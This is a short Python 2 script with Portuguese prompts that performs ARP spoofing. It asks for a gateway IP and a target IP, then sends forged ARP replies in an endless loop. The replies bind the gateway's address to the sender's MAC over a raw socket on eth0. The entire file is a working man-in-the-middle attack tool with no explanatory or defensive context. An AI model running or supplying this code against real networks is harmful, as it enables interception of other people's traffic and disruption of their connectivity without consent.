import socket
import struct
import binascii
from time import sleep


def Mac():

    fd = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    fd.bind(('eth0', 999))
    mac = fd.getsockname()[-1]
    return ''.join(['%02x' % ord(n) for n in mac])

s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
s.bind(('eth0', 0))

ips = raw_input("digite o ip do gatway")
ipd = raw_input("Digite o ip do alvo")
ipS = socket.inet_aton(ips)
ipD = socket.inet_aton(ipd)


def ARPstruct():
    MacS = Mac()
    MacT = '000000000000'

    ARP = struct.pack('!HHBBH6s4s6s4s', 0x0001,
                    0x800,
                    6,
                    4,
                    0x002, MacS.decode('hex'), ipS, MacT.decode('hex'), ipD)

    return ARP


def EtherStruct():

    MacV = 'ffffffffffff'
    MacS = Mac()
    ether = struct.pack('!6s6sH', binascii.unhexlify(MacV), binascii.unhexlify(MacS), 0x0806)
    return ether


while 1:
    s.send(EtherStruct()+ARPstruct())
    print "Sending ARP..."
    sleep(1.5)

